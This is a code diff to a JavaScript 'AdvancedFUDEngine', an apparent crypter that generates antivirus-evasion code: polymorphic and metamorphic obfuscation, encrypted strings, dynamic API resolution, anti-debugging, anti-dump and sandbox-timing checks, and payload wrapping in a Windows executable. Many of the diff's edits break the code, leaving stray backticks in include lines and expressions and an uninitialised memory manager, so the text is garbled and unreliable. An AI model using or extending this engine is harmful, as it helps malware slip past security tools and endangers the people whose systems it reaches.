@@ -7,18 +7,32 @@ const crypto = require('crypto');
 const os = require('os');
 const { exec, spawn } = require('child_process');
 const { promisify } = require('util');
+const { getMemoryManager } = require('../utils/memory-manager');
 const fs = require('fs').promises;
 const { logger } = require('../utils/logger');
 
 const execAsync = promisify(exec);
 
 class AdvancedFUDEngine {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
-        this.polymorphicVariants = new Map();
-        this.metamorphicEngines = new Map();
-        this.obfuscationTechniques = new Map();
-        this.memoryProtectionMethods = new Map();
-        this.behavioralEvasionPatterns = new Map();
+        this.polymorphicVariants = this.memoryManager.createManagedCollection('polymorphicVariants', 'Map', 100);
+        this.metamorphicEngines = this.memoryManager.createManagedCollection('metamorphicEngines', 'Map', 100);
+        this.obfuscationTechniques = this.memoryManager.createManagedCollection('obfuscationTechniques', 'Map', 100);
+        this.memoryProtectionMethods = this.memoryManager.createManagedCollection('memoryProtectionMethods', 'Map', 100);
+        this.behavioralEvasionPatterns = this.memoryManager.createManagedCollection('behavioralEvasionPatterns', 'Map', 100);
         
         // FUD techniques array
         this.fudTechniques = [
@@ -265,7 +279,7 @@ class AdvancedFUDEngine {
         const stringRegex = /"([^"\\]|\\.)*"/g;
         return code.replace(stringRegex, (match) => {
             const encrypted = this.encryptString(match);
-            return `decrypt("${encrypted}")`;
+            return `decrypt(`${encrypted})`;
         });
     }
 
@@ -302,17 +316,17 @@ class AdvancedFUDEngine {
         // Implement control flow flattening
         const flattenedCode = code.replace(/if\s*\([^)]+\)\s*{([^}]+)}/g, (match, body) => {
             const stateVar = this.generateRandomName();
-            return `
+            return "
             int ${stateVar} = 0;
             while (true) {
                 switch (${stateVar}) {
                     case 0: ${stateVar} = condition ? 1 : 2; break;
                     case 1: ${body} ${stateVar} = 3; break;
-                    case 2: ${stateVar} = 3; break;
+                    case 2: " + stateVar + " = 3; break;
                     case 3: goto end;
                 }
             }
-            end:`;
+            end:";
         });
         return flattenedCode;
     }
@@ -509,7 +523,7 @@ class AdvancedFUDEngine {
             'javascript': `
                 // FUD Control Flow Obfuscation
                 const fudRandom = Math.random();
-                if (fudRandom > 0.5) {
+                if (fudRandom >` 0.5) {
                     // Legitimate code path
                 } else {
                     // Alternative code path
@@ -526,7 +540,7 @@ class AdvancedFUDEngine {
         const protectionPatterns = {
             'cpp': `
                 // FUD Memory Protection
-                #include <windows.h>
+                #include <windows.h>`
                 DWORD oldProtect;
                 VirtualProtect(code_ptr, size, PAGE_EXECUTE_READWRITE, &oldProtect);
                 // Execute protected code
@@ -556,9 +570,9 @@ class AdvancedFUDEngine {
         const timingPatterns = {
             'cpp': `
                 // Real FUD Timing Evasion
-                #include <chrono>
-                #include <thread>
-                #include <random>
+                #include <chrono>`
+                #include <thread>`
+                #include <random>`
                 auto start = std::chrono::high_resolution_clock::now();
                 
                 // Real legitimate processing - file I/O operations
@@ -577,7 +591,7 @@ class AdvancedFUDEngine {
                 std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
                 
                 auto end = std::chrono::high_resolution_clock::now();
-                auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
+                auto duration = std::chrono::duration_cast<std::chrono::milliseconds>`(end - start);
             `,
             'python': `
                 # Real FUD Timing Evasion
@@ -736,7 +750,7 @@ class AdvancedFUDEngine {
             newLines.push(line);
             if (Math.random() < 0.1) { // 10% chance to insert junk
                 const junk = junkInstructions[Math.floor(Math.random() * junkInstructions.length)];
-                newLines.push(`    ${junk}; // FUD Junk`);
+                newLines.push("    " + junk + "; // FUD Junk");
             }
         }
         
@@ -748,10 +762,10 @@ class AdvancedFUDEngine {
         const networkPatterns = {
             'cpp': `
                 // Real FUD Network Pattern
-                #include <winsock2.h>
-                #include <ws2tcpip.h>
-                #include <iostream>
-                #include <string>
+                #include <winsock2.h>`
+                #include <ws2tcpip.h>`
+                #include <iostream>`
+                #include <string>`
                 WSADATA wsaData;
                 WSAStartup(MAKEWORD(2,2), &wsaData);
                 // Real legitimate network activity - DNS resolution
@@ -916,9 +930,9 @@ class AdvancedFUDEngine {
         const interactionPatterns = {
             'cpp': `
                 // FUD User Interaction
-                #include <windows.h>
-                #include <winuser.h>
-                #include <psapi.h>
+                #include <windows.h>`
+                #include <winuser.h>`
+                #include <psapi.h>`
                 
                 POINT cursorPos;
                 GetCursorPos(&cursorPos);
@@ -1040,8 +1054,8 @@ class AdvancedFUDEngine {
         const timingPatterns = {
             'cpp': `
                 // Real FUD Human Timing
-                #include <windows.h>
-                #include <psapi.h>
+                #include <windows.h>`
+                #include <psapi.h>`
                 Sleep(100 + (rand() % 500));
                 // Real human-like delays based on system performance
                 DWORD systemLoad = GetTickCount() % 1000;
@@ -1145,7 +1159,7 @@ class AdvancedFUDEngine {
         const encryptionPatterns = {
             'cpp': `
                 // FUD Memory Encryption
-                #include <windows.h>
+                #include <windows.h>`
                 DWORD oldProtect;
                 VirtualProtect(memory_ptr, size, PAGE_EXECUTE_READWRITE, &oldProtect);
                 // Encrypt memory region
@@ -1198,7 +1212,7 @@ class AdvancedFUDEngine {
         const antiDumpPatterns = {
             'cpp': `
                 // FUD Anti-Dump
-                #include <windows.h>
+                #include <windows.h>`
                 IsDebuggerPresent();
                 CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
             `,
@@ -1273,7 +1287,7 @@ class AdvancedFUDEngine {
 
     generateTypeMappings(types) {
         const mappings = new Map();
-        const shuffled = [...types].sort(() => Math.random() - 0.5);
+        const shuffled = [...types].sort(() =>` Math.random() - 0.5);
         types.forEach((type, index) => {
             mappings.set(type, shuffled[index]);
         });
@@ -1403,7 +1417,7 @@ class AdvancedFUDEngine {
     async obfuscateAllAPICalls(code, language) {
         // Obfuscate all API calls using dynamic resolution
         return code.replace(/(\w+)\(/g, (match, apiName) => {
-            return `GetProcAddress(GetModuleHandle("kernel32.dll"), "${this.encryptString(apiName)}")()`;
+            return "GetProcAddress(GetModuleHandle("kernel32.dll"), `${this.encryptString(apiName)}`)()";
         });
     }
 
@@ -1441,26 +1455,26 @@ class AdvancedFUDEngine {
     async applySteganographicEncoding(code, language) {
         // Apply steganographic encoding to hide code
         const encodedCode = Buffer.from(code).toString('base64');
-        return `
+        return "
         // Steganographically encoded data
-        const char* encodedData = "${encodedCode}";
+        const char* encodedData = `${encodedCode}`;
         // Decode at runtime
-        `;
+        ";
     }
 
     async embedInLegitimateFormats(code, language) {
         // Embed code in legitimate file formats
-        return `
+        return "
         // Embedded in legitimate PE structure
-        #include <windows.h>
-        #include <stdio.h>
+        #include <windows.h>`
+        #include <stdio.h>`
         
         // Legitimate application entry point
         int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-            ${code}
+            " + code + "
             return 0;
         }
-        `;
+        ";
     }
 
     async applyMetamorphicEngine(code, language) {
@@ -1486,7 +1500,7 @@ class AdvancedFUDEngine {
         // Add random spacing and reorder lines
         for (let i = 0; i < lines.length; i++) {
             restructuredLines.push(lines[i]);
-            if (Math.random() > 0.7) {
+            if (Math.random() >` 0.7) {
                 restructuredLines.push('    // Optimization comment');
             }
         }
@@ -1525,10 +1539,10 @@ class AdvancedFUDEngine {
         // Add anti-heuristic measures
         const antiHeuristicCode = `
         // Real Anti-heuristic measures
-        #include <windows.h>
-        #include <psapi.h>
-        #include <tlhelp32.h>
-        #include <winternl.h>
+        #include <windows.h>`
+        #include <psapi.h>`
+        #include <tlhelp32.h>`
+        #include <winternl.h>`
         
         void antiHeuristic1() {
             // Real legitimate application behavior
@@ -1665,12 +1679,12 @@ class AdvancedFUDEngine {
         
         obfuscatedCode = obfuscatedCode.replace(/\b0x[0-9a-fA-F]+\b/g, (match) => {
             const value = parseInt(match, 16);
-            return `(0x${(value ^ 0x12345678).toString(16)})`;
+            return "(0x" + (value ^ 0x12345678).toString(16) + ")";
         });
         
         obfuscatedCode = obfuscatedCode.replace(/\b\d+\b/g, (match) => {
             const value = parseInt(match);
-            return `(${value} + 0)`;
+            return "(" + value + " + 0)";
         });
         
         return obfuscatedCode;
